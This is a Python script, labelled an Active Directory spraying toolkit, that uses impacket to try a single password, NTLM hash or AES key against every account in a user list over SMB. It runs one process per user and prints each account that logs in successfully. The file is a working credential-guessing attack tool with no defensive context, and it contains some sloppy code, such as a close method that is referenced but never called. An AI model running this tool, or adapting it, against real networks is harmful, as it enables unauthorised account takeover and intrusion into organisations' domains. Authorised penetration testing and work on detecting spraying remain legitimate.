#!/usr/bin/python3
from __future__ import division
from __future__ import print_function
import sys
import argparse
import re
from impacket.smbconnection import SMBConnection
from impacket import smbconnection
import multiprocessing
import traceback

            
def login(username, password, domain, lmhash, nthash, aesKey, dc_ip, target_ip, port):
    try:
        smbClient = SMBConnection(target_ip, target_ip, sess_port=int(port))
        if aesKey:
            smbClient.kerberosLogin(username, password, domain, lmhash, nthash, aesKey, dc_ip)
        else:
            smbClient.login(username, password, domain, lmhash, nthash)
        print("Success %s\%s" % (domain, username))
        SMBConnection.close
    except smbconnection.SessionError as e:
        return
    except Exception as e:
        print(e)
        return


def main():
    parser = argparse.ArgumentParser(add_help = True, description = "Active Directory Spraying Toolkit")
    
    group = parser.add_argument_group('authentication')
    group.add_argument('-userlist', action='store', metavar = "userlist", help='List of users to spray, format is [[domain/]username')
    group.add_argument('-password', action="store", metavar = "password", help='Clear-text password')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. This may be any be any domain joined computer or a domain controller')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')

    group = parser.add_argument_group('threads')
    group.add_argument('-threads', action="store", metavar = "threads", help='Number of threads to use, default is 1')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.password is None and options.hashes is None and options.aesKey is None:
        parser.print_help()
        sys.exit(1)
    
    if options.userlist is None:
        parser.print_help()
        sys.exit(1)

    if options.target_ip is None:
        parser.print_help()
        sys.exit(1)

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''
    
    if options.password is None:
        password = ''
    else:
        password = options.password
    
    if options.threads is None:
        threads = 1
    else:
        threads = int(options.threads)

    #threading
    jobs = []
    procs = int(threads) # Number of processes to create
    with open(options.userlist, 'r') as users:
        for _user in users.readlines():
            domain = ''
            try:
                domain, user = re.compile(r',*\\').split(_user)
            except:
                user = _user
            process = multiprocessing.Process(target=login,
            args=(user.strip(), options.password, domain, lmhash, nthash, options.aesKey, options.dc_ip, options.target_ip, options.port))
            jobs.append(process)

    # Start the processes (i.e. calculate the random number lists)      
    for j in jobs:
        j.start()

    # Ensure all of the processes have finished
    for j in jobs:
        j.join()

    print("Done spraying %s Users" % len(jobs))

if __name__ == "__main__":
    main()